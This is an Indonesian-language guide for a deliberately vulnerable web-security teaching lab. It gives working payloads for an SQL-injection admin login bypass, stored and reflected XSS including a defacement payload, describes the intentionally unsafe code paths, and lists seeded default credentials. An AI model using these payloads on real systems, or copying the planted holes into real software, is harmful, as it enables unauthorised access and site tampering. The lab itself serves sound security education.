# Panduan Pengujian & Payload — Lab Keamanan Web

Dokumen ini berisi langkah pengujian dan contoh payload untuk tiga celah yang sengaja
ditanam saat `LAB_MODE=true`:

1. **SQL Injection (auth bypass)** — form login admin (`/admin/login`)
2. **Stored XSS** — deskripsi kategori (tampil di halaman utama `/`)
3. **Reflected XSS** — parameter pencarian katalog (`/catalog?q=...`)

> ⚠️ Jalankan hanya di lingkungan kelas/localhost. Jangan pernah expose instance
> `LAB_MODE=true` ke internet publik.

## 0. Persiapan

Setelah menarik perubahan ini, jalankan ulang seed supaya kolom `password` dan akun
default tersedia di database:

```bash
npm run db:seed
# atau otomatis lewat: npm run build
```

Akun default hasil seed (`db/seed.sql`):

| Role  | Email                          | Password    |
|-------|---------------------------------|-------------|
| ADMIN | admin@sumbermakmur.desa         | koperasi123 |
| USER  | warga@sumbermakmur.desa         | warga123    |

Login yang sah (tanpa injeksi) juga bisa dites dulu dengan kredensial di atas untuk
memastikan alur normal berjalan sebelum mencoba bypass.

---

## 1. SQL Injection — Bypass Login Admin

**Lokasi:** `/admin/login`
**Sink:** `lib/admin.ts` fungsi `login()` — saat `LAB_MODE=true`, query dibangun dengan
penggabungan string langsung ke MariaDB:

```sql
SELECT id, name, email, role
FROM users
WHERE email = '<input email>'
  AND password = '<input password>'
  AND role = 'ADMIN'
LIMIT 1
```

Karena input tidak di-escape, penyerang bisa mengubah struktur query lewat field
**Email**, tanpa perlu tahu password aslinya.

### Payload

Isi field **Email**, field **Kata sandi** boleh diisi apa saja (mis. `x`):

```text
admin@sumbermakmur.desa' -- 
```

Query yang terbentuk:

```sql
SELECT id, name, email, role FROM users
WHERE email = 'admin@sumbermakmur.desa' -- ' AND password = 'x' AND role = 'ADMIN' LIMIT 1
```

`-- ` mengomentari sisa query (termasuk pengecekan password), sehingga cukup dengan
email yang valid untuk login sebagai admin.

Variasi payload lain yang juga berhasil (tempel di field **Email**):

```text
' OR '1'='1
```

```text
' OR 1=1 -- 
```

```text
' OR role='ADMIN' LIMIT 1 -- 
```

Setelah berhasil, server mengeset cookie `admin_session` dan kamu akan diarahkan ke
`/admin` — semua halaman `/admin/*` sudah dilindungi `middleware.ts`, jadi login (atau
bypass-nya) benar-benar diperlukan untuk mengaksesnya.

### (Opsional) UNION-based — menampilkan data palsu

Karena query hanya mengembalikan 4 kolom (`id, name, email, role`), input berikut di
field **Email** bisa dipakai untuk mendemonstrasikan UNION-based injection:

```text
' UNION SELECT 1,'Injected Admin','hacker@example.com','ADMIN' -- 
```

### Verifikasi fungsinya sudah ditutup di tempat lain

Search bar katalog (`/catalog?q=...`) **tidak lagi** rentan SQL injection — sudah
memakai parameterized query. Coba payload lama di sana:

```text
/catalog?q=' OR 1=1 OR p.name LIKE '
```

Hasilnya akan diperlakukan sebagai teks pencarian biasa (kemungkinan besar "Tidak ada
produk"), bukan mengembalikan seluruh baris seperti sebelumnya.

---

## 2. Stored XSS — Deskripsi Kategori

**Lokasi input:** `/admin/categories/[id]/edit` (field **Deskripsi**), atau saat
membuat kategori baru di `/admin/categories/new`.
**Lokasi eksekusi:** halaman utama `/` — bagian "Kategori", dirender lewat
`dangerouslySetInnerHTML` saat `LAB_MODE=true`.

### Langkah

1. Login ke `/admin` (pakai kredensial sah atau hasil bypass SQLi di atas).
2. Buka `/admin/categories`, pilih salah satu kategori → **Edit**.
3. Isi field **Deskripsi** dengan salah satu payload di bawah, lalu **Simpan**.
4. Buka `/` (halaman utama) dan lihat bagian **Kategori** — payload akan tereksekusi.

### Payload

Popup sederhana:

```html
<script>alert('Stored XSS Berhasil')</script>
```

Jika `<script>` diblokir/tidak jalan di browser tertentu karena cara injeksi DOM,
gunakan varian berbasis event handler (lebih reliable untuk `innerHTML`):

```html
<img src="x" onerror="alert('Stored XSS via onerror')">
```

Menampilkan cookie yang bisa diakses JavaScript (untuk edukasi tentang pencurian sesi):

```html
<img src="x" onerror="alert(document.cookie)">
```

> Catatan: cookie `admin_session` diset dengan flag `httpOnly`, jadi **tidak akan
> muncul** di `document.cookie`. Ini contoh yang bagus untuk mendiskusikan kenapa
> `HttpOnly` penting sebagai mitigasi dampak XSS terhadap pencurian sesi.

Defacement sederhana (mengganti isi halaman):

```html
<img src="x" onerror="document.body.innerHTML='<h1>Halaman ini sudah diretas (demo)</h1>'">
```

---

## 3. Reflected XSS — Parameter Pencarian Katalog

**Lokasi:** `/catalog?q=...`
**Sink:** `app/catalog/page.tsx`, kotak "Input pencarian" merender ulang `q` sebagai
HTML mentah lewat `dangerouslySetInnerHTML` saat `LAB_MODE=true`.

### Payload

Akses langsung lewat URL (browser akan meng-encode otomatis saat dari address bar,
atau encode manual bila dipakai di link/form):

```text
/catalog?q=<script>alert('Reflected XSS')</script>
```

Jika perlu URL-encoded manual:

```text
/catalog?q=%3Cscript%3Ealert('Reflected%20XSS')%3C%2Fscript%3E
```

Atau lewat kotak pencarian di halaman `/catalog` — ketik payload lalu klik **Cari**.

---

## Ringkasan cepat

| Kerentanan            | Lokasi input                          | Lokasi eksekusi          | Payload contoh                                  |
|------------------------|----------------------------------------|---------------------------|--------------------------------------------------|
| SQL Injection           | `/admin/login` (field Email)          | Query login ke MariaDB    | `admin@sumbermakmur.desa' -- `                    |
| Stored XSS              | `/admin/categories/[id]/edit`         | `/` (bagian Kategori)     | `<img src=x onerror=alert('Stored XSS Berhasil')>` |
| Reflected XSS           | `/catalog?q=...`                      | `/catalog` (kotak hasil)  | `<script>alert('Reflected XSS')</script>`          |
